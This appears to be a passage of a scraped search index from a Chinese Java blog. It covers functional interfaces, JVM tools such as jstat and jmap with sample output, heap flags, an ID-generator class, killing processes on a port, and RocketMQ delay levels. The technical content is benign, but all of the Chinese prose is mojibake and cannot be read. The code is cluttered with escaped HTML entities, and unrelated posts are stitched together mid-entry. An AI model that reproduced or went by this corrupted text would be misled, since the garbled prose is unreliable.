nameMap.computeIfAbsent(\u0026#34;name\u0026#34;, s -\u0026gt; s.length()); ä¸Šé¢çš„ä¾‹å­ä¸­æˆ‘ä»¬è°ƒç”¨äº†mapçš„computeIfAbsentæ–¹æ³•ï¼Œä¼ å…¥ä¸€ä¸ªFunctionã€‚\nä¸Šé¢çš„ä¾‹å­è¿˜å¯ä»¥æ”¹å†™æˆæ›´çŸ­çš„ï¼š\nInteger value1 = nameMap.computeIfAbsent(\u0026#34;name\u0026#34;, String::length); Functionæ²¡æœ‰æŒ‡æ˜å‚æ•°å’Œè¿”å›å€¼çš„ç±»å‹ï¼Œå¦‚æœéœ€è¦ä¼ å…¥ç‰¹å®šçš„å‚æ•°ï¼Œåˆ™å¯ä»¥ä½¿ç”¨IntFunction, LongFunction, DoubleFunctionï¼š\n@FunctionalInterface public interface IntFunction\u0026lt;R\u0026gt; { /** * Applies this function to the given argument. * * @param value the function argument * @return the function result */ R apply(int value); } å¦‚æœéœ€è¦è¿”å›ç‰¹å®šçš„å‚æ•°ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ToIntFunction, ToLongFunction, ToDoubleFunctionï¼š\n@FunctionalInterface public interface ToDoubleFunction\u0026lt;T\u0026gt; { /** * Applies this function to the given argument. * * @param value the function argument * @return the function result */ double applyAsDouble(T value); } å¦‚æœè¦åŒæ—¶æŒ‡å®šå‚æ•°å’Œè¿”å›å€¼ï¼Œåˆ™å¯ä»¥ä½¿ç”¨DoubleToIntFunction, DoubleToLongFunction, IntToDoubleFunction, IntToLongFunction, LongToIntFunction, LongToDoubleFunctionï¼š\n@FunctionalInterface public interface LongToIntFunction { /** * Applies this function to the given argument. * * @param value the function argument * @return the function result */ int applyAsInt(long value); } BiFunctionï¼šæ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªè¿”å›å€¼\r#\rå¦‚æœéœ€è¦æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªè¿”å›å€¼çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨BiFunctionï¼šBiFunction, ToDoubleBiFunction, ToIntBiFunction, ToLongBiFunctionç­‰ã€‚\n@FunctionalInterface public interface BiFunction\u0026lt;T, U, R\u0026gt; { /** * Applies this function to the given arguments. * * @param t the first function argument * @param u the second function argument * @return the function result */ R apply(T t, U u); æˆ‘ä»¬çœ‹ä¸€ä¸ªBiFunctionçš„ä¾‹å­ï¼š\n//BiFunction Map\u0026lt;String, Integer\u0026gt; salaries = new HashMap\u0026lt;\u0026gt;(); salaries.put(\u0026#34;alice\u0026#34;, 100); salaries.put(\u0026#34;jack\u0026#34;, 200); salaries.put(\u0026#34;mark\u0026#34;, 300); salaries.replaceAll((name, oldValue) -\u0026gt; name.equals(\u0026#34;alice\u0026#34;) ? oldValue : oldValue + 200); Supplierï¼šæ— å‚çš„Function\r#\rå¦‚æœä»€ä¹ˆå‚æ•°éƒ½ä¸éœ€è¦ï¼Œåˆ™å¯ä»¥ä½¿ç”¨Supplierï¼š\n@FunctionalInterface public interface Supplier\u0026lt;T\u0026gt; { /** * Gets a result. * * @return a result */ T get(); } Consumerï¼šæ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œä¸è¿”å›å€¼\r#\rConsumeræ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯ä¸è¿”å›ä»»ä½•å€¼ï¼Œæˆ‘ä»¬çœ‹ä¸‹Consumerçš„å®šä¹‰ï¼š\n@FunctionalInterface public interface Consumer\u0026lt;T\u0026gt; { /** * Performs this operation on the given argument. * * @param t the input argument */ void accept(T t); çœ‹ä¸€ä¸ªConsumerçš„å…·ä½“åº”ç”¨ï¼š\n//Consumer nameMap.forEach((name, age) -\u0026gt; System.out.println(name + \u0026#34; is \u0026#34; + age + \u0026#34; years old\u0026#34;)); Predicateï¼šæ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œè¿”å›boolean\r#\rPredicateæ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œè¿”å›booleanå€¼ï¼š\n@FunctionalInterface public interface Predicate\u0026lt;T\u0026gt; { /** * Evaluates this predicate on the given argument. * * @param t the input argument * @return {@code true} if the input argument matches the predicate, * otherwise {@code false} */ boolean test(T t); } å¦‚æœç”¨åœ¨é›†åˆç±»çš„è¿‡æ»¤ä¸Šé¢é‚£æ˜¯æå¥½çš„ï¼š\n//Predicate List\u0026lt;String\u0026gt; names = Arrays.asList(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;E\u0026#34;); List\u0026lt;String\u0026gt; namesWithA = names.stream() .filter(name -\u0026gt; name.startsWith(\u0026#34;A\u0026#34;)) .collect(Collectors.toList()); Operatorï¼šæ¥æ”¶å’Œè¿”å›åŒæ ·çš„ç±»å‹\r#\rOperatoræ¥æ”¶å’Œè¿”å›åŒæ ·çš„ç±»å‹ï¼Œæœ‰å¾ˆå¤šç§Operatorï¼šUnaryOperator BinaryOperator ï¼ŒDoubleUnaryOperator, IntUnaryOperator, LongUnaryOperator, DoubleBinaryOperator, IntBinaryOperator, LongBinaryOperatorç­‰ã€‚\n@FunctionalInterface public interface IntUnaryOperator { /** * Applies this operator to the given operand. * * @param operand the operand * @return the operator result */ int applyAsInt(int operand); } æˆ‘ä»¬çœ‹ä¸€ä¸ªBinaryOperatorçš„ä¾‹å­ï¼š\n//Operator List\u0026lt;Integer\u0026gt; values = Arrays.asList(1, 2, 3, 4, 5); int sum = values.stream().reduce(0, (i1, i2) -\u0026gt; i1 + i2); "},{"id":48,"href":"/posts/history/jvm%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/","title":"Jvmå¸¸ç”¨å·¥å…·","section":"æˆ‘çš„åšå®¢","content":"\rJVMå¸¸ç”¨å·¥å…·\r#\rjps\r#\rJavaç‰ˆçš„pså‘½ä»¤ï¼Œä¸»è¦ç”¨äºæŸ¥çœ‹Javaåº”ç”¨çš„è¿›ç¨‹å·,å¯åŠ¨JVMçš„å‚æ•°ã€‚\njps [options] [hostid]\noptionså‚æ•°:\n-l è¾“å‡ºç±»å‘½åæˆ–è€…jarè·¯å¾„ -q è¾“å‡ºLVMID -m è¾“å‡ºJVMå¯åŠ¨æ—¶ä¼ ç»™main()çš„å‚æ•° -v è¾“å‡ºJVMå¯åŠ¨æ—¶æ˜¾ç¤ºæŒ‡ä»¤å‚æ•° ä¾‹å­ï¼š\njps -l è¾“å‡ºjaråŒ…è·¯å¾„ï¼Œç±»å…¨å jps -m è¾“å‡ºmainå‚æ•° jps -v è¾“å‡ºJVMå‚æ•° jinfo\r#\rjinfoæ˜¯ç”¨æ¥æŸ¥çœ‹JVMå‚æ•°å’ŒåŠ¨æ€ä¿®æ”¹éƒ¨åˆ†JVMå‚æ•°çš„å‘½ä»¤\nå‘½ä»¤æ ¼å¼ï¼š\njinfo [option] optionså‚æ•°è§£é‡Šï¼š\n-flag æ‰“å°æŒ‡å®šåç§°çš„å‚æ•° -flag [+|-] æ‰“å¼€æˆ–å…³é—­å‚æ•° -flag = è®¾ç½®å‚æ•° -flags æ‰“å°æ‰€æœ‰å‚æ•° -sysprops æ‰“å°ç³»ç»Ÿé…ç½® æ‰“å°ä¸Šé¢ä¸¤ä¸ªé€‰é¡¹ ç¤ºä¾‹ï¼š\nå…¶ä¸­11666ä¸ºpid\næŸ¥çœ‹JVMå‚æ•°å’Œç³»ç»Ÿé…ç½®\njinfo 11666 jinfo -flags 11666 jinfo -sysprops 11666 æŸ¥çœ‹æ‰“å°GCæ—¥å¿—å‚æ•°\njinfo -flag PrintGC 11666 jinfo -flag PrintGCDetails 11666 æ‰“å¼€GCæ—¥å¿—å‚æ•°\njinfo -flag +PrintGC 11666 jinfo -flag +PrintGCDetails 11666 å…³é—­GCæ—¥å¿—å‚æ•°\njinfo -flag -PrintGC 11666 jinfo -flag -PrintGCDetails 11666 è¿˜å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æŸ¥çœ‹é‚£äº›å‚æ•°å¯ä»¥ä½¿ç”¨jinfoå‘½ä»¤æ¥ç®¡ç†ï¼š\njava -XX:+PrintFlagsFinal -version | grep manageable jstat\r#\rjstatå‘½ä»¤æ˜¯ä½¿ç”¨é¢‘ç‡æ¯”è¾ƒé«˜çš„å‘½ä»¤ï¼Œä¸»è¦ç”¨æ¥æŸ¥çœ‹JVMè¿è¡Œæ—¶çš„çŠ¶æ€ä¿¡æ¯ï¼ŒåŒ…æ‹¬å†…å­˜çŠ¶æ€ã€åƒåœ¾å›æ”¶ç­‰ã€‚\nå‘½ä»¤æ ¼å¼ï¼š\njstat [option] LVMID [interval] [count]\nå…¶ä¸­LVMIDæ˜¯è¿›ç¨‹idï¼Œintervalæ˜¯æ‰“å°é—´éš”æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ï¼Œcountæ˜¯æ‰“å°æ¬¡æ•°ï¼ˆé»˜è®¤ä¸€ç›´æ‰“å°ï¼‰\noptionå‚æ•°è§£é‡Šï¼š\n-class class loaderçš„è¡Œä¸ºç»Ÿè®¡ -compiler HotSpt JITç¼–è¯‘å™¨è¡Œä¸ºç»Ÿè®¡ -gc åƒåœ¾å›æ”¶å †çš„è¡Œä¸ºç»Ÿè®¡ -gccapacity å„ä¸ªåƒåœ¾å›æ”¶ä»£å®¹é‡(young,old,perm)å’Œä»–ä»¬ç›¸åº”çš„ç©ºé—´ç»Ÿè®¡ -gcutil åƒåœ¾å›æ”¶ç»Ÿè®¡æ¦‚è¿° -gccause åƒåœ¾æ”¶é›†ç»Ÿè®¡æ¦‚è¿°ï¼ˆåŒ-gcutilï¼‰ï¼Œé™„åŠ æœ€è¿‘ä¸¤æ¬¡åƒåœ¾å›æ”¶äº‹ä»¶çš„åŸå›  -gcnew æ–°ç”Ÿä»£è¡Œä¸ºç»Ÿè®¡ -gcnewcapacity æ–°ç”Ÿä»£ä¸å…¶ç›¸åº”çš„å†…å­˜ç©ºé—´çš„ç»Ÿè®¡ -gcold å¹´è€ä»£å’Œæ°¸ç”Ÿä»£è¡Œä¸ºç»Ÿè®¡ -gcoldcapacity å¹´è€ä»£è¡Œä¸ºç»Ÿè®¡ -gcpermcapacity æ°¸ç”Ÿä»£è¡Œä¸ºç»Ÿè®¡ -printcompilation HotSpotç¼–è¯‘æ–¹æ³•ç»Ÿè®¡ å¸¸ç”¨ç¤ºä¾‹åŠæ‰“å°å­—æ®µè§£é‡Šï¼š\njstat -gcutil 11666 1000 3 11666ä¸ºpidï¼Œæ¯éš”1000æ¯«ç§’æ‰“å°ä¸€æ¬¡ï¼Œæ‰“å°3æ¬¡\nè¾“å‡ºï¼š\nS0 S1 E O M CCS YGC YGCT FGC FGCT GCT 6.17 0.00 6.39 33.72 93.42 90.57 976 57.014 68 53.153 110.168 6.17 0.00 6.39 33.72 93.42 90.57 976 57.014 68 53.153 110.168 6.17 0.00 6.39 33.72 93.42 90.57 976 57.014 68 53.153 110.168 å­—æ®µè§£é‡Š:\nS0 survivor0ä½¿ç”¨ç™¾åˆ†æ¯” S1 survivor1ä½¿ç”¨ç™¾åˆ†æ¯” E EdenåŒºä½¿ç”¨ç™¾åˆ†æ¯” O è€å¹´ä»£ä½¿ç”¨ç™¾åˆ†æ¯” M å…ƒæ•°æ®åŒºä½¿ç”¨ç™¾åˆ†æ¯” CCS å‹ç¼©ä½¿ç”¨ç™¾åˆ†æ¯” YGC å¹´è½»ä»£åƒåœ¾å›æ”¶æ¬¡æ•° YGCT å¹´è½»ä»£åƒåœ¾å›æ”¶æ¶ˆè€—æ—¶é—´ FGC è€å¹´ä»£åƒåœ¾å›æ”¶æ¬¡æ•° FGCT è€å¹´ä»£åƒåœ¾å›æ”¶æ¶ˆè€—æ—¶é—´ GCT åƒåœ¾å›æ”¶æ¶ˆè€—æ€»æ—¶é—´ jstat -gc 11666 1000 3 -gcå’Œ-gcutilå‚æ•°ç±»ä¼¼ï¼Œåªä¸è¿‡è¾“å‡ºå­—æ®µä¸æ˜¯ç™¾åˆ†æ¯”ï¼Œè€Œæ˜¯å®é™…çš„å€¼ã€‚\nè¾“å‡ºï¼š\nS0C S1C S0U S1U EC EU OC OU MC MU CCSC CCSU YGC YGCT FGC FGCT GCT 25600.0 25600.0 0.0 1450.0 204800.0 97460.7 512000.0 172668.8 345736.0 322997.7 48812.0 44209.0 977 57.040 68 53.153 110.193 25600.0 25600.0 0.0 1450.0 204800.0 97460.7 512000.0 172668.8 345736.0 322997.7 48812.0 44209.0 977 57.040 68 53.153 110.193 25600.0 25600.0 0.0 1450.0 204800.0 97460.7 512000.0 172668.8 345736.0 322997.7 48812.0 44209.0 977 57.040 68 53.153 110.193 å­—æ®µè§£é‡Šï¼š\nS0C survivor0å¤§å° S1C survivor1å¤§å° S0U survivor0å·²ä½¿ç”¨å¤§å° S1U survivor1å·²ä½¿ç”¨å¤§å° EC EdenåŒºå¤§å° EU EdenåŒºå·²ä½¿ç”¨å¤§å° OC è€å¹´ä»£å¤§å° OU è€å¹´ä»£å·²ä½¿ç”¨å¤§å° MC æ–¹æ³•åŒºå¤§å° MU æ–¹æ³•åŒºå·²ä½¿ç”¨å¤§å° CCSC å‹ç¼©ç±»ç©ºé—´å¤§å° CCSU å‹ç¼©ç±»ç©ºé—´å·²ä½¿ç”¨å¤§å° YGC å¹´è½»ä»£åƒåœ¾å›æ”¶æ¬¡æ•° YGCT å¹´è½»ä»£åƒåœ¾å›æ”¶æ¶ˆè€—æ—¶é—´ FGC è€å¹´ä»£åƒåœ¾å›æ”¶æ¬¡æ•° FGCT è€å¹´ä»£åƒåœ¾å›æ”¶æ¶ˆè€—æ—¶é—´ GCT åƒåœ¾å›æ”¶æ¶ˆè€—æ€»æ—¶é—´ jstack\r#\rjstackæ˜¯ç”¨æ¥æŸ¥çœ‹JVMçº¿ç¨‹å¿«ç…§çš„å‘½ä»¤ï¼Œçº¿ç¨‹å¿«ç…§æ˜¯å½“å‰JVMçº¿ç¨‹æ­£åœ¨æ‰§è¡Œçš„æ–¹æ³•å †æ ˆé›†åˆã€‚ä½¿ç”¨jstackå‘½ä»¤å¯ä»¥å®šä½çº¿ç¨‹å‡ºç°é•¿æ—¶é—´å¡é¡¿çš„åŸå› ï¼Œä¾‹å¦‚æ­»é”ï¼Œæ­»å¾ªç¯ç­‰ã€‚jstackè¿˜å¯ä»¥æŸ¥çœ‹ç¨‹åºå´©æºƒæ—¶ç”Ÿæˆçš„coreæ–‡ä»¶ä¸­çš„stackä¿¡æ¯ã€‚\nå‘½ä»¤æ ¼å¼ï¼š\njstack [-l] (è¿æ¥è¿è¡Œä¸­çš„è¿›ç¨‹)\njstack -F [-m] [-l] (è¿æ¥æŒ‚èµ·çš„è¿›ç¨‹)\njstack [-m] [-l] (è¿æ¥coreæ–‡ä»¶)\njstack [-m] [-l] [server_id@] (è¿æ¥è¿œç¨‹debugæœåŠ¡å™¨)\noptionå‚æ•°è§£é‡Šï¼š\n-F å½“ä½¿ç”¨jstack æ— å“åº”æ—¶ï¼Œå¼ºåˆ¶è¾“å‡ºçº¿ç¨‹å †æ ˆã€‚ -m åŒæ—¶è¾“å‡ºjavaå’Œæœ¬åœ°å †æ ˆ(æ··åˆæ¨¡å¼) -l é¢å¤–æ˜¾ç¤ºé”ä¿¡æ¯ jmap\r#\rjmapæ˜¯ç”¨æ¥ç”Ÿæˆå †dumpæ–‡ä»¶å’ŒæŸ¥çœ‹å †ç›¸å…³çš„å„ç±»ä¿¡æ¯çš„å‘½ä»¤ï¼Œä¾‹å¦‚æŸ¥çœ‹finalizeæ‰§è¡Œé˜Ÿåˆ—ï¼Œheapçš„è¯¦ç»†ä¿¡æ¯å’Œä½¿ç”¨æƒ…å†µã€‚\nå‘½ä»¤æ ¼å¼ï¼š\njmap [option] (è¿æ¥æ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹) jmap [option] \u0026lt;executable (è¿æ¥ä¸€ä¸ªcoreæ–‡ä»¶) jmap [option] [server_id@] (é“¾æ¥è¿œç¨‹æœåŠ¡å™¨)\noptionå‚æ•°è§£é‡Šï¼š\nto print same info as Solaris pmap -heap æ‰“å°java heapæ‘˜è¦ -histo[:live] æ‰“å°å †ä¸­çš„javaå¯¹è±¡ç»Ÿè®¡ä¿¡æ¯ -clstats æ‰“å°ç±»åŠ è½½å™¨ç»Ÿè®¡ä¿¡æ¯ -finalizerinfo æ‰“å°åœ¨f-queueä¸­ç­‰å¾…æ‰§è¡Œfinalizeræ–¹æ³•çš„å¯¹è±¡ -dump: ç”Ÿæˆjavaå †çš„dumpæ–‡ä»¶ dump-options: live åªè½¬å‚¨å­˜æ´»çš„å¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šåˆ™è½¬å‚¨æ‰€æœ‰å¯¹è±¡ format=b äºŒè¿›åˆ¶æ ¼å¼ file= è½¬å‚¨æ–‡ä»¶åˆ° -F å¼ºåˆ¶é€‰é¡¹ ç¤ºä¾‹ï¼š\njmap -dump:live,format=b,file=dump.hprof 11666 è¾“å‡ºï¼š\nDumping heap to /dump.hprof ... Heap dump file created è¿™ä¸ªå‘½ä»¤æ˜¯è¦æŠŠjavaå †ä¸­çš„å­˜æ´»å¯¹è±¡ä¿¡æ¯è½¬å‚¨åˆ°dump.hprofæ–‡ä»¶\njmap -heap 11666 è¾“å‡ºå †çš„è¯¦ç»†ä¿¡æ¯\nè¾“å‡ºï¼š\nHeap Configuration: //å †å†…å­˜åˆå§‹åŒ–é…ç½® MinHeapFreeRatio = 0 //å¯¹åº”jvmå¯åŠ¨å‚æ•°-XX:MinHeapFreeRatioè®¾ç½®JVMå †æœ€å°ç©ºé—²æ¯”ç‡(default 40) MaxHeapFreeRatio = 100 //å¯¹åº”jvmå¯åŠ¨å‚æ•° -XX:MaxHeapFreeRatioè®¾ç½®JVMå †æœ€å¤§ç©ºé—²æ¯”ç‡(default 70) MaxHeapSize = 1073741824 (1024.0MB) //å¯¹åº”jvmå¯åŠ¨å‚æ•°-XX:MaxHeapSize=è®¾ç½®JVMå †çš„æœ€å¤§å¤§å° NewSize = 22020096 (21.0MB) //å¯¹åº”jvmå¯åŠ¨å‚æ•°-XX:NewSize=è®¾ç½®JVMå †çš„æ–°ç”Ÿä»£çš„é»˜è®¤å¤§å° MaxNewSize = 357564416 (341.0MB) //å¯¹åº”jvmå¯åŠ¨å‚æ•°-XX:MaxNewSize=è®¾ç½®JVMå †çš„æ–°ç”Ÿä»£çš„æœ€å¤§å¤§å° OldSize = 45088768 (43.0MB) //å¯¹åº”jvmå¯åŠ¨å‚æ•°-XX:OldSize=\u0026lt;value\u0026gt;:è®¾ç½®JVMå †çš„è€å¹´ä»£çš„å¤§å° NewRatio = 2 //å¯¹åº”jvmå¯åŠ¨å‚æ•°-XX:NewRatio=:æ–°ç”Ÿä»£å’Œè€ç”Ÿä»£çš„å¤§å°æ¯”ç‡ SurvivorRatio = 8 //å¯¹åº”jvmå¯åŠ¨å‚æ•°-XX:SurvivorRatio=è®¾ç½®æ–°ç”Ÿä»£ä¸­EdenåŒºä¸SurvivoråŒºçš„å¤§å°æ¯”å€¼ MetaspaceSize = 21807104 (20.796875MB) // å…ƒæ•°æ®åŒºå¤§å° CompressedClassSpaceSize = 1073741824 (1024.0MB) //ç±»å‹ç¼©ç©ºé—´å¤§å° MaxMetaspaceSize = 17592186044415 MB //å…ƒæ•°æ®åŒºæœ€å¤§å¤§å° G1HeapRegionSize = 0 (0.0MB) //G1åƒåœ¾æ”¶é›†å™¨æ¯ä¸ªRegionå¤§å° Heap Usage: //å †å†…å­˜ä½¿ç”¨æƒ…å†µ PS Young Generation Eden Space: //EdenåŒºå†…å­˜åˆ†å¸ƒ capacity = 17825792 (17.0MB) //EdenåŒºæ€»å®¹é‡ used = 12704088 (12.115562438964844MB) //EdenåŒºå·²ä½¿ç”¨ free = 5121704 (4.884437561035156MB) //EdenåŒºå‰©ä½™å®¹é‡ 71.26801434685203% used //EdenåŒºä½¿ç”¨æ¯”ç‡ From Space: //å…¶ä¸­ä¸€ä¸ªSurvivoråŒºçš„å†…å­˜åˆ†å¸ƒ capacity = 2097152 (2.0MB) used \\= 1703936 (1.625MB) free \\= 393216 (0.375MB) 81.25% used To Space: //å¦ä¸€ä¸ªSurvivoråŒºçš„å†…å­˜åˆ†å¸ƒ capacity = 2097152 (2.0MB) used \\= 0 (0.0MB) free \\= 2097152 (2.0MB) 0.0% used PS Old Generation capacity \\= 52428800 (50.0MB) //è€å¹´ä»£å®¹é‡ used = 28325712 (27.013504028320312MB) //è€å¹´ä»£å·²ä½¿ç”¨ free = 24103088 (22.986495971679688MB) //è€å¹´ä»£ç©ºé—² 54.027008056640625% used //è€å¹´ä»£ä½¿ç”¨æ¯”ç‡ jmap -histo:live 11666 | ``more è¾“å‡ºå­˜æ´»å¯¹è±¡ç»Ÿè®¡ä¿¡æ¯\nè¾“å‡ºï¼š\nnum #instances #bytes class name ---------------------------------------------- 1: 46608 1111232 java.lang.String 2: 6919 734516 java.lang.Class 3: 4787 536164 java.net.SocksSocketImpl 4: 15935 497100 java.util.concurrent.ConcurrentHashMap$Node 5: 28561 436016 java.lang.Object jvisualVM\r#\rå›¾å½¢åŒ–åˆ†æå·¥å…·ã€‚\nå¸¸ç”¨JVMå‚æ•°ï¼š\r#\r-Xmsï¼šåˆå§‹å †å¤§å°ï¼Œé»˜è®¤ä¸ºç‰©ç†å†…å­˜çš„1/64(\u0026lt;1GB)ï¼›é»˜è®¤(MinHeapFreeRatioå‚æ•°å¯ä»¥è°ƒæ•´)ç©ºä½™å †å†…å­˜å°äº40%æ—¶ï¼ŒJVMå°±ä¼šå¢å¤§å †ç›´åˆ°-Xmxçš„æœ€å¤§é™åˆ¶\n-Xmxï¼šæœ€å¤§å †å¤§å°ï¼Œé»˜è®¤(MaxHeapFreeRatioå‚æ•°å¯ä»¥è°ƒæ•´)ç©ºä½™å †å†…å­˜å¤§äº70%æ—¶ï¼ŒJVMä¼šå‡å°‘å †ç›´åˆ° -Xmsçš„æœ€å°é™åˆ¶\n-Xmnï¼šæ–°ç”Ÿä»£çš„å†…å­˜ç©ºé—´å¤§å°ï¼Œæ³¨æ„ï¼šæ­¤å¤„çš„å¤§å°æ˜¯ï¼ˆeden+ 2 survivor space)ã€‚ä¸jmap -heapä¸­æ˜¾ç¤ºçš„New genæ˜¯ä¸åŒçš„ã€‚æ•´ä¸ªå †å¤§å°=æ–°ç”Ÿä»£å¤§å° + è€ç”Ÿä»£å¤§å° + æ°¸ä¹…ä»£å¤§å°ã€‚\nåœ¨ä¿è¯å †å¤§å°ä¸å˜çš„æƒ…å†µä¸‹ï¼Œå¢å¤§æ–°ç”Ÿä»£å,å°†ä¼šå‡å°è€ç”Ÿä»£å¤§å°ã€‚æ­¤å€¼å¯¹ç³»ç»Ÿæ€§èƒ½å½±å“è¾ƒå¤§,Sunå®˜æ–¹æ¨èé…ç½®ä¸ºæ•´ä¸ªå †çš„3/8ã€‚\n-XX:SurvivorRatioï¼šæ–°ç”Ÿä»£ä¸­EdenåŒºåŸŸä¸SurvivoråŒºåŸŸçš„å®¹é‡æ¯”å€¼ï¼Œé»˜è®¤å€¼ä¸º8ã€‚ä¸¤ä¸ªSurvivoråŒºä¸ä¸€ä¸ªEdenåŒºçš„æ¯”å€¼ä¸º2:8,ä¸€ä¸ªSurvivoråŒºå æ•´ä¸ªå¹´è½»ä»£çš„1/10ã€‚\n-Xssï¼šæ¯ä¸ªçº¿ç¨‹çš„å †æ ˆå¤§å°ã€‚JDK5.0ä»¥åæ¯ä¸ªçº¿ç¨‹å †æ ˆå¤§å°ä¸º1M,ä»¥å‰æ¯ä¸ªçº¿ç¨‹å †æ ˆå¤§å°ä¸º256Kã€‚åº”æ ¹æ®åº”ç”¨çš„çº¿ç¨‹æ‰€éœ€å†…å­˜å¤§å°è¿›è¡Œé€‚å½“è°ƒæ•´ã€‚åœ¨ç›¸åŒç‰©ç†å†…å­˜ä¸‹,\nå‡å°è¿™ä¸ªå€¼èƒ½ç”Ÿæˆæ›´å¤šçš„çº¿ç¨‹ã€‚ä½†æ˜¯æ“ä½œç³»ç»Ÿå¯¹ä¸€ä¸ªè¿›ç¨‹å†…çš„çº¿ç¨‹æ•°è¿˜æ˜¯æœ‰é™åˆ¶çš„ï¼Œä¸èƒ½æ— é™ç”Ÿæˆï¼Œç»éªŒå€¼åœ¨3000~5000å·¦å³ã€‚ä¸€èˆ¬å°çš„åº”ç”¨ï¼Œ å¦‚æœæ ˆä¸æ˜¯å¾ˆæ·±ï¼Œ åº”è¯¥æ˜¯128kå¤Ÿç”¨çš„ï¼Œ\nå¤§çš„åº”ç”¨å»ºè®®ä½¿ç”¨256kã€‚è¿™ä¸ªé€‰é¡¹å¯¹æ€§èƒ½å½±å“æ¯”è¾ƒå¤§ï¼Œéœ€è¦ä¸¥æ ¼çš„æµ‹è¯•ã€‚å’Œthreadstacksizeé€‰é¡¹è§£é‡Šå¾ˆç±»ä¼¼,å®˜æ–¹æ–‡æ¡£ä¼¼ä¹æ²¡æœ‰è§£é‡Š,\nåœ¨è®ºå›ä¸­æœ‰è¿™æ ·ä¸€å¥è¯:\u0026quot;-Xss ``is translated ``in a VM flag named ThreadStackSizeâ€ä¸€èˆ¬è®¾ç½®è¿™ä¸ªå€¼å°±å¯ä»¥äº†ã€‚\n-XX:PermSizeï¼šè®¾ç½®æ°¸ä¹…ä»£(perm gen)åˆå§‹å€¼ã€‚é»˜è®¤å€¼ä¸ºç‰©ç†å†…å­˜çš„1/64ã€‚\n-XX:MaxPermSizeï¼šè®¾ç½®æŒä¹…ä»£æœ€å¤§å€¼ã€‚ç‰©ç†å†…å­˜çš„1/4ã€‚\n"},{"id":49,"href":"/posts/history/%E7%94%9F%E6%88%90%E4%B8%9A%E5%8A%A1id/","title":"ç”Ÿæˆä¸šåŠ¡ ID","section":"æˆ‘çš„åšå®¢","content":"ç”Ÿæˆå”¯ä¸€çš„ä¸šåŠ¡IDå·\npublic class UniqueStringGenerator { private static final int MAX_COUNTER = 10000; private volatile static int COUNTER = 0; private static final String PAD_STR = \u0026#34;0\u0026#34;; private static DateTimeFormatter FORMATTER = DateTimeFormatter.ofPattern(\u0026#34;yyMMddHHmmssSSS\u0026#34;); public static synchronized String generatorId() { if (COUNTER \u0026gt; MAX_COUNTER) { COUNTER = 0; } String uniqueNumber = getNowString() + getNumberString(); COUNTER++; return uniqueNumber; } private static String getNowString() { LocalDateTime ldt = LocalDateTime.now(); return ldt.format(FORMATTER); } private static String getNumberString() { return StringUtils.leftPad(String.valueOf(COUNTER), String.valueOf(MAX_COUNTER).length(), PAD_STR); } } "},{"id":50,"href":"/posts/history/kill%E6%8E%89java%E8%BF%9B%E7%A8%8B/","title":"Killæ‰javaè¿›ç¨‹","section":"æˆ‘çš„åšå®¢","content":"å¼€å‘æ—¶æœ‰å¯èƒ½ä¼šå‡ºç°ç«¯å£è¢«å ç”¨ï¼Œæˆ–è€…å¼‚å¸¸èƒ½å‡ºæ—¶ï¼Œé‡å¯ï¼Œç«¯å£ä¼šè¢«å ç”¨çš„æƒ…å†µã€‚ è¿™é‡Œéœ€è¦killæ— ç”¨çš„è¿›ç¨‹ã€‚\nåœ¨windowsç³»ç»Ÿä¸‹ï¼š\n# æŸ¥è¯¢ç«¯å£è¿›ç¨‹çš„PID netstat -ano| findstr 8080 # ä¹Ÿå¯ä»¥ä½¿ç”¨javaå·¥å…·jpsæŸ¥çœ‹javaåº”ç”¨è¿›ç¨‹ jps # killæ‰è¿›ç¨‹ taskkill /pid [pid] /f åœ¨Linuxç³»ç»Ÿä¸‹ï¼š\njps kill [pid] "},{"id":51,"href":"/posts/history/rocketmq%E5%BB%B6%E6%97%B6%E6%B6%88%E6%81%AF%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%BB%B6%E6%97%B6%E7%BA%A7%E5%88%AB%E7%9A%84%E9%85%8D%E7%BD%AE/","title":"Rocket Mqå»¶æ—¶æ¶ˆæ¯çš„ä½¿ç”¨å’Œå»¶æ—¶çº§åˆ«çš„é…ç½®","section":"æˆ‘çš„åšå®¢","content":"\rRocketMQå»¶æ—¶æ¶ˆæ¯çš„ä½¿ç”¨å’Œå»¶æ—¶çº§åˆ«çš„é…ç½®\r#\rå¼€æºæ¡†æ¶çš„æ²¡æœ‰__STARTDELIVERTIMEé…ç½® é˜¿é‡Œä¼ä¸šçº§æ²¡æœ‰messageDelayLevelé…ç½®\næ¶ˆæ¯tag __TAG æ¶ˆæ¯key __KEY æ¶ˆæ¯ID __MSGID é‡è¯•æ¬¡æ•° __RECONSUMETIMES è®¾ç½®æ¶ˆæ¯çš„å®šæ—¶æŠ•é€’æ—¶é—´ï¼ˆç»å¯¹æ—¶é—´),æœ€å¤§å»¶è¿Ÿæ—¶é—´ä¸º7å¤©. __STARTDELIVERTIME è®¾ç½®æ¶ˆæ¯çš„å»¶è¿Ÿçº§åˆ«ï¼Œå…¶ä¸­ï¼Œlevel=0 çº§è¡¨ç¤ºä¸å»¶æ—¶ _DELAYTIMEVELVEL åœ¨æœåŠ¡å™¨ç«¯ï¼ˆrocketmq-brokerç«¯ï¼‰çš„å±æ€§é…ç½®æ–‡ä»¶ä¸­åŠ å…¥ä»¥ä¸‹è¡Œï¼š messageDelayLevel=1s 5s 10s 30s 1m 2m 3m 4m 5m 6m 7m 8m 9m 10m 20m 30m 1h 2h 